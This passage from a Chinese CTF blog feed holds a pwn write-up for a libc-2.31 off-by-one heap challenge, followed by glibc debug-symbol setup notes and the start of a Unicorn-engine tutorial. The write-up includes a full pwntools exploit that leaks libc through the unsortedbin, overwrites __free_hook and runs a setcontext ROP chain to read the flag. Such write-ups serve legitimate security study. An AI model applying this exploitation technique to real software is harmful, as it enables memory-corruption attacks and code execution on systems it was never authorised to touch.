&#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ol><li>填满<code>tcache bin</code>中<code>0xc0</code>大小的堆块，使得下一块<code>0xc0</code>大小的堆块被释放后会进入<code>unsortedbin</code></li><li>申请6个<code>0x31</code>大小的堆块（第6个堆块用于防止unsortedbin大小堆块的合并）</li><li>用第1个堆块修改第二个堆块的<code>size</code>位为<code>0xc1</code>，再将第2个堆块释放掉，该堆块便能进入<code>unsortedbin</code></li><li>切割<code>unsortedbin</code>泄露出<code>libc</code>基址，并造成堆块重叠</li><li>利用堆块重叠，我们通过修改<code>fd</code>可以申请修改<code>__free_hook</code>为跳板<code>gadget</code>：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000001518B0                 mov     rdx, [rdi+8]</span><br><span class="line">.text:00000000001518B4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">.text:00000000001518B8                 call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure><ol start="6"><li>申请回两个<code>0xb0</code>大小的堆块，对释放的堆块构造如下：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">0x55fb03c8db90:0x00000000000000000x00000000000000c1</span><br><span class="line">0x55fb03c8dba0:0x00007f0b8b87ab720x000055fb03c8dd50/* ORW_ROP链</span><br><span class="line">0x55fb03c8dbb0:0x00007f0b8b87d04f0x0000000000000000</span><br><span class="line">0x55fb03c8dbc0:0x00007f0b8b89e4000x0000000000000002</span><br><span class="line">0x55fb03c8dbd0:0x00007f0b8b9650000x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dbe0:0x00000000000000030x00007f0b8b87d04f</span><br><span class="line">0x55fb03c8dbf0:0x000055fb03c8dd500x00007f0b8b970241</span><br><span class="line">0x55fb03c8dc00:0x00000000000000200x0000000000000000</span><br><span class="line">0x55fb03c8dc10:0x00007f0b8b964ff00x00007f0b8b87ab72</span><br><span class="line">0x55fb03c8dc20:0x00000000000000010x00007f0b8b965090</span><br><span class="line">0x55fb03c8dc30:0x00000000000000000x0000000000000000</span><br><span class="line">0x55fb03c8dc40:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x55fb03c8dc50:0x00000000000000000x00000000000000c1/* 需要释放的堆块</span><br><span class="line">0x55fb03c8dc60:0x000055fb03c8dc600x000055fb03c8dc60/* mov rdx, [rdi+8]</span><br><span class="line">0x55fb03c8dc70:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dc80:0x00007f0b8b8abf8d0x6161616161616161/* call qword ptr [rdx+20h]</span><br><span class="line">0x55fb03c8dc90:0x61616161616161610x6161616161616161&lt;=&gt; call &lt;setcontext+53&gt;</span><br><span class="line">0x55fb03c8dca0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcb0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcc0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcd0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dce0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dcf0:0x61616161616161610x6161616161616161</span><br><span class="line">0x55fb03c8dd00:0x000055fb03c8dba00x00007f0b8b879679</span><br><span class="line">/* mov rsp, QWORD PTR [rdx+0xa0] &lt;=&gt; mov rsp, [ORW_ROP链]</span><br><span class="line">/* mov rcx, [rdx+0A8h] &lt;=&gt; mov rcx, [ret]</span><br><span class="line">/* push rcx</span><br><span class="line">/* ret &lt;=&gt; ret [rcx]</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./orz&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note size : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input your note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;please input new note.\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choose which one?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please input note index.\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># fill up 0xc1 tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0xb0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># off-by-one to leak libc_base </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0-5</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x28</span>+<span class="string">&#x27;\xc1&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc_base====&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overlapping to leak heap_base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">0x28</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#6-8 &lt;==&gt;2-4</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    heap_base=u64(io.recv(<span class="number">8</span>))&amp;<span class="number">0xfffffffff000</span>-<span class="number">0x2000</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hijack __free_hook</span></span><br><span class="line">    edit(<span class="number">7</span>,p64(free_hook)+<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base====&gt;&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    magic=libc_base+<span class="number">0x1518B0</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,p64(magic))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gadgets</span></span><br><span class="line">    pop_rax_ret=libc_base+<span class="number">0x0000000000047400</span></span><br><span class="line">    pop_rdi_ret=libc_base+<span class="number">0x0000000000023b72</span></span><br><span class="line">    pop_rsi_ret=libc_base+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12_ret=libc_base+<span class="number">0x0000000000119241</span></span><br><span class="line">    ret=libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">    syscall=libc_base+<span class="number">0x0000000000010E000</span></span><br><span class="line"></span><br><span class="line">    flag_addr=heap_base+<span class="number">0xd50</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    orw_rop=p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    orw_rop+=p64(pop_rax_ret)+p64(<span class="number">2</span>)+p64(syscall)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">    orw_rop+=p64(pop_rdx_r12_ret)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    orw_rop+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    rop_addr=heap_base+<span class="number">0xba0</span></span><br><span class="line">    jmp_addr=heap_base+<span class="number">0xc60</span></span><br><span class="line">    setcontext=libc_base+<span class="number">0x54f8d</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># construct heap &amp; trigger __free_hook</span></span><br><span class="line">    add(<span class="number">0xb0</span>,p64(jmp_addr)*<span class="number">2</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(setcontext)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x78</span>+p64(rop_addr)+p64(ret))<span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0xb0</span>,orw_rop)<span class="comment">#10</span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="其他：patchelf后修复gdb的debug符号表"><a href="#其他：patchelf后修复gdb的debug符号表" class="headerlink" title="其他：patchelf后修复gdb的debug符号表"></a>其他：patchelf后修复gdb的debug符号表</h3><p><code>patchelf</code>修改了<code>libc</code>和<code>ld</code>，而<code>gdb</code>调试时会去寻找<code>libc</code>目录下的<code>.debug</code>文件，所以无法使用一些<code>heap/bins</code>之类的命令，因此我们去<code>glibc-all-in-one</code>中下载对应版本的<code>libc</code>及其附带的<code>.debug</code>。</p><p>实现操作如下：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>在该目录下<code>ctrl+h</code>便能显示出隐藏文件<code>.debug</code>，将<code>.debug</code>复制到题目的目录下，<code>gdb</code>调试命令就恢复了。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><blockquote><p><a href="https://verf1sh.github.io/2022/05/25/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/#midpwn">第二届广东大学生网络安全大赛-by Verfish</a></p><p><a href="https://trick.ink/article/glibc-all-in-one/">Glibc-All-In-One</a></p><p><a href="https://bbs.pediy.com/thread-254868.htm">关于不同版本 glibc 更换的一些问题</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;赛前复盘一道&lt;code&gt;libc2.31&lt;/code&gt;的&lt;code&gt;off-by-one&lt;/code&gt;漏洞利用的题目。&lt;/p&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="libc-2.31" scheme="http://example.com/tags/libc-2-31/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="http://example.com/2022/06/24/unicorn/"/>
    <id>http://example.com/2022/06/24/unicorn/</id>
    <published>2022-06-24T02:46:31.000Z</published>
    <updated>2023-02-06T11:17:54.969Z</updated>
    
    <content type="html"><![CDATA[<p>结合 ctf赛题 学习一下 unicorn 引擎的基础使用。</p><p><a href="https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1">参考文章</a></p><p><a href="https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md">unicorn中文文档</a></p><span id="more"></span><h2 id="hxp-CTF-2017-Fibonacci"><a href="#hxp-CTF-2017-Fibonacci" class="headerlink" title="hxp CTF 2017 Fibonacci"></a>hxp CTF 2017 Fibonacci</h2><p>运行该二进制程序时，我们发现打印<code>flag</code>的速度越来越慢：</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/177336/3/25517/8754/62b52868E53cee082/a11a2873758db905.png" alt="1656039526862.png"></p><p>因此必须对该程序进行优化，在合理时间内打印出<code>flag</code></p><p>利用<code>ida_pro</code>反编译看一下程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// r9</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">7</span>]; <span class="comment">// [rsp+Ch] [rbp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;unk_4007E1;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The flag is: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v5) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      FIB(v4 + v5, v10);<span class="comment">//调用 FIB 函数</span></span><br><span class="line">      v8 = v7;</span><br><span class="line">      v5 = v7 + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 != <span class="number">8</span> );</span><br><span class="line">    v4 += <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (v10[<span class="number">0</span>] &lt;&lt; v8) == v6 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">    _IO_putc(v6 ^ (LOBYTE(v10[<span class="number">0</span>]) &lt;&lt; v8), <span class="built_in">stdout</span>);<span class="comment">//打印 flag 字符</span></span><br><span class="line">  &#125;</span><br><span class="line">  _IO_putc(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看一下<code>FIB</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">FIB</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er12</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a1 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = FIB(<span class="number">0LL</span>, a2);<span class="comment">// 出口</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = FIB((a1 - <span class="number">2</span>), a2);<span class="comment">// 递归调用 FIB</span></span><br><span class="line">      result = v3 + FIB((a1 - <span class="number">1</span>), a2);<span class="comment">// 递归调用 FIB</span></span><br><span class="line">    &#125;</span><br><span class="line">    v5 = ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>;</span><br><span class="line">    v6 = v5</span><br><span class="line">       + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)</span><br><span class="line">       + ((v5 + ((result - ((result &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>)) &amp; <span class="number">0x33333333</span>)) &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    *a2 ^= ((BYTE1(v6) &amp; <span class="number">0xF</span>) + (v6 &amp; <span class="number">0xF</span>) + ((((v6 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xF0F0F</span>) + (v6 &amp; <span class="number">0xF0F0F0F</span>)) &gt;&gt; <span class="number">16</span>)) &amp; <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a2 ^= <span class="number">1u</span>;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看到程序在不断递归调用<code>FIB</code>，而递归函数的缺点显而易见：</p><ol><li><p>递归由于是函数调用自身，而<strong>函数调用是有时间和空间的消耗</strong>的：每一次函数调用，都需要在内存栈中分配空间以保存参数、返回地址以及临时变量，而<strong>往栈中压入数据和弹出数据都需要时间</strong>。-&gt;效率</p></li><li><p>递归中很多计算都是重复的，由于其本质是把一个问题分解成两个或者多个小问题，<strong>多个小问题存在相互重叠的部分</strong>，则存在重复计算，如<code>fibonacci斐波那契数列</code>的递归实现。-&gt;效率</p></li></ol><p>因此需要考虑优化问题，若选择重构代码则太过复杂，且易产生<code>bug</code>，而使用<code>unicorn</code>就能很好地避免这个问题。</p><h3 id="1-利用unicorn运行目标程序"><a href="#1-利用unicorn运行目标程序" class="headerlink" title="1. 利用unicorn运行目标程序"></a>1. 利用unicorn运行目标程序</h3><p>首先先将需要的库导入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *<span class="comment"># 导入unicorn库</span></span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *<span class="comment"># 因为程序是x86架构的，故导入x86的常量</span></span><br><span class="line"><span class="keyword">import</span> struct<span class="comment"># 用于打包数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):<span class="comment"># 读取目标文件的数据</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:<span class="comment"># 以二进制格式打开一个文件用于只读</span></span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title 